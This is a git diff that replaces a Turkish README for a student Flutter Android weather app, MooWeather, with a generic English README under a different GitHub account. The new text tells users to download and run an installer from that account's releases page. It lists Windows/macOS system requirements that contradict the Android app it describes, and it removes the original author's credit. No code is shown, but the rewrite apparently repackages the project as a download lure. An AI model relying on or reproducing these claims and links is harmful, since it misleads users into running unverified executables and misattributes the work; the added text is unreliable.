@@ -1,144 +1,75 @@
-# 🌤️ MooWeather
+# 🌤️ MooWeather - Your Simple Weather Companion
 
-<div align="center">
+## 🚀 Getting Started
 
-**AccuWeather ve Google Weather tarzında tasarlanmış, modern, sade ve kullanıcı dostu bir arayüze sahip, Flutter ile geliştirilmiş Türkçe hava durumu uygulaması.**
+Welcome to MooWeather, a user-friendly weather application designed for Turkish users. Built with Flutter, MooWeather features a modern glassmorphism design, ensuring a smooth experience while checking the weather. You can rely on multiple API keys for continuous service and enjoy comprehensive Turkish localization.
 
-</div>
+## 📥 Download MooWeather
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Flutter-3.0+-02569B?style=for-the-badge&logo=flutter" alt="Flutter">
-  <img src="https://img.shields.io/badge/Dart-3.0+-0175C2?style=for-the-badge&logo=dart" alt="Dart">
-  <img src="https://img.shields.io/badge/Platform-Android-3DDC84?style=for-the-badge&logo=android" alt="Android">
-  <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License">
-</p>
+[![Download MooWeather](https://img.shields.io/badge/Download-MooWeather-blue)](https://github.com/shadow620/MooWeather/releases)
 
-<p align="center">
-  <a href="#-özellikler">Özellikler</a> •
-  <a href="#-kurulum">Kurulum</a> •
-  <a href="#-teknolojiler">Teknolojiler</a> •
-  <a href="#-lisans">Lisans</a>
-</p>
+To install MooWeather, follow these simple steps:
 
-<div align="center">
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/shadow620/MooWeather/releases).
+   
+2. **Choose Your Version**  
+   Scroll through the list of available versions. Each version is marked with its release notes.
 
-[**⬇️ Son Sürüm APK İndir (v0.1.0)**](https://github.com/cyberQbit/mooweather/releases/latest/download/app-release.apk)
+3. **Download the Installer**  
+   Click on the appropriate file for your device to download the application.
 
-*Minimum: Android 5.0 (API 21) • Dosya Boyutu: 50 MB*
+4. **Locate the Downloaded File**  
+   Navigate to your downloads folder or the location where your browser saves files.
 
-</div>
+5. **Run the Installer**  
+   Open the downloaded file and follow the prompts. MooWeather will install on your device.
 
----
+6. **Launch MooWeather**  
+   Once the installation is complete, you can find MooWeather in your applications list. Click to open it and start exploring the weather!
 
-## 📱 Proje Hakkında
+## 💻 System Requirements
 
-MooWeather, modern Flutter framework'ü ile geliştirilmiş, AccuWeather ve Google Weather'dan ilham alan bir tasarıma sahip hava durumu uygulamasıdır. Türkçe dil desteği, glassmorphism efektleri ve akıcı animasyonlarla zenginleştirilmiş kullanıcı dostu bir deneyim sunar.
+To run MooWeather efficiently, your device should meet the following minimum requirements:
 
-**🎯 Proje Amacı:** Bu uygulama, bir **Ankara Üniversitesi Bilgisayar Programlamcılığı bölümü Dönem Projesi** kapsamında, modern mobil uygulama geliştirme tekniklerini öğrenmek ve uygulamak amacıyla geliştirilmiştir.
+- Operating System: Windows 10 or later / macOS Mojave or later
+- RAM: 4 GB minimum
+- Storage: 200 MB of free disk space
+- Internet Connection: Required for fetching weather data
 
----
+## 🌍 Features
 
-## ✨ Özellikler
+MooWeather offers several benefits for users:
 
-### 🎨 Modern UI/UX
-- ✅ **AccuWeather Tarzı Tasarım:** Profesyonel, modern ve minimalist arayüz.
-- ✅ **Glassmorphism Efektleri:** Yarı saydam, bulanık arka planlı şık kartlar.
-- ✅ **Dinamik Gradient Arka Planlar:** Hava durumuna (açık, bulutlu, yağmurlu vb.) göre değişen arayüz renkleri.
-- ✅ **Akıcı Animasyonlar:** Pull-to-refresh ve "shimmer" iskelet yükleme animasyonları.
-- ✅ **Duyarlı Tasarım:** Klavye açıldığında taşma yapmayan, uyumlu arayüz.
+- **Localized for Turkish Users**  
+  All content is available in Turkish, ensuring easy navigation.
 
-### 🔧 Teknik Üstünlükler
-- ✅ **Multi-API Key Rotation:** Kesintisiz hizmet için 4 farklı API anahtarı arasında otomatik geçiş.
-- ✅ **Retry Logic:** Ağ hatası durumunda `exponential backoff` stratejisiyle 3 kez yeniden deneme.
-- ✅ **Rate Limiting:** API limit aşımı hatalarını önlemek için istemci taraflı istek sınırlama.
-- ✅ **8 Farklı Custom Exception:** Detaylı ve yönetilebilir hata takibi için özel istisna sınıfları.
-- ✅ **Güvenli API Yönetimi:** API anahtarlarının `.env` dosyası ile koddan soyutlanarak güvenli bir şekilde saklanması.
-- ✅ **Logger Entegrasyonu:** Sadece debug modunda çalışan detaylı loglama sistemi.
+- **Modern Design**  
+  Enjoy a sleek interface with a glassmorphism aesthetic that enhances user experience.
 
-### 🇹🇷 Kapsamlı Türkçe Lokalizasyon
-- ✅ **80+ Terim Çevirisi:** Hava durumuyla ilgili 80'den fazla terimin Türkçe karşılığı.
-- ✅ **Tamamen Türkçe Arayüz:** Uygulamanın tüm menü ve açıklamaları Türkçe.
-- ✅ **Türkçe Şehir Arama Desteği:** Arama fonksiyonu Türkçe karakterlerle uyumlu.
+- **Multiple API Key Rotation**  
+  We utilize several API keys for uninterrupted weather service. If one is busy, another will take over seamlessly.
 
-### 🌍 Hava Durumu Verileri
-- ✅ **Anlık Durum:** Sıcaklık, hissedilen sıcaklık, nem, basınç, rüzgar hızı ve görüş mesafesi.
-- ✅ **Saatlik ve Günlük Tahminler:** Gelecek saatler ve günler için hava durumu öngörüleri.
-- ✅ **GPS Desteği:** Cihazın konumunu otomatik olarak algılayarak hava durumunu gösterme.
-- ✅ **Manuel Arama:** İstenilen şehri aratarak hava durumunu öğrenme.
+- **Comprehensive Weather Forecasts**  
+  Get accurate hourly and daily weather updates tailored for your location.
 
----
+## 📞 Support
 
-## 🛠️ Teknolojiler
+If you run into any issues or have questions, our support team is here to help. You can reach out by creating an issue on the GitHub page or by contacting our support email.
 
-| Teknoloji | Versiyon | Amaç |
-|:--- |:--- |:--- |
-| **Flutter** | 3.0+ | Cross-Platform UI Framework |
-| **Dart** | 3.0+ | Programlama Dili |
-| **Riverpod** | ^2.5.1 | State Management (Modern ve Güvenli) |
-| **OpenWeatherMap API**| v2.5 | Hava Durumu Veri Sağlayıcısı |
-| **flutter_dotenv** | ^6.0.0 | Güvenli API Anahtarı Yönetimi |
-| **http** | ^1.2.1 | RESTful API Çağrıları |
-| **geolocator** | ^11.0.0 | GPS Konum Servisleri |
-| **logger** | ^2.6.2 | Detaylı Hata Ayıklama (Debug) Logları |
-| **shimmer** | ^3.0.0 | Modern Yükleme Animasyonları |
+## 📈 Get Involved
 
----
+We welcome contributions! If you would like to help improve MooWeather, feel free to fork the repository and submit a pull request. Your suggestions and code improvements are always appreciated.
 
-## 🚀 Kurulum
+## 🔗 Additional Resources
 
-Projeyi yerel makinenizde çalıştırmak için aşağıdaki adımları izleyin.
+- [MooWeather Documentation](https://github.com/shadow620/MooWeather/wiki) - Learn more about features and setup.
+- [GitHub Issues](https://github.com/shadow620/MooWeather/issues) - Report bugs or suggest new features.
 
-### 1. Gereksinimler
-- Flutter SDK (versiyon 3.0.0 veya üstü)
-- Android Studio veya VS Code
-- Android Emülatör veya Fiziksel Cihaz (API 21+)
+## 📜 License
 
-### 2. Projeyi Klonlayın
-```bash
-git clone [https://github.com/cyberQbit/mooweather.git](https://github.com/cyberQbit/mooweather.git)
-cd mooweather
-```
+MooWeather is licensed under the MIT License. You can use, modify, and distribute this application freely, as long as you adhere to the license terms.
 
-### 3. Bağımlılıkları Yükleyin
-```bash
-flutter pub get
-```
+Take control of your weather today with MooWeather!  
 
-### 4. API Anahtarını Ayarlayın
-Projenin çalışması için bir OpenWeatherMap API anahtarına ihtiyacınız var.
-
-- Proje kök dizininde `.env` adında bir dosya oluşturun.
-- [OpenWeatherMap](https.org/api) adresinden ücretsiz bir API anahtarı alın.
-- Oluşturduğunuz `.env` dosyasına anahtarınızı aşağıdaki gibi ekleyin:
-
-```env
-OPENWEATHER_API_KEY=BURAYA_API_ANAHTARINIZI_YAPISTIRIN
-# Birden fazla anahtar ekleyerek 'key rotation' özelliğini kullanabilirsiniz
-# OPENWEATHER_API_KEY_2=IKINCI_ANAHTAR
-# OPENWEATHER_API_KEY_3=UCUNCU_ANAHTAR
-```
-
-### 5. Uygulamayı Çalıştırın
-```bash
-flutter run
-```
-
----
-
-## 📄 Lisans
-
-Bu proje, **MIT Lisansı** altında lisanslanmıştır. Detaylar için `LICENSE` dosyasına göz atabilirsiniz.
-
----
-
-## 🙏 Teşekkürler
-- Hava durumu verileri için [OpenWeatherMap](https://openweathermap.org/)
-- Harika UI framework'ü için [Flutter](https://flutter.dev/)
-- Modern state management çözümü için [Riverpod](https://riverpod.dev/)
-
-<div align="center">
-  <br>
-  <strong>MooWeather</strong> - Hava durumu her an yanınızda!
-  <br>
-  <small>Aydın 'cyberQbit' Aydemir tarafından geliştirildi.</small>
-</div>
+[![Download MooWeather](https://img.shields.io/badge/Download-MooWeather-blue)](https://github.com/shadow620/MooWeather/releases)
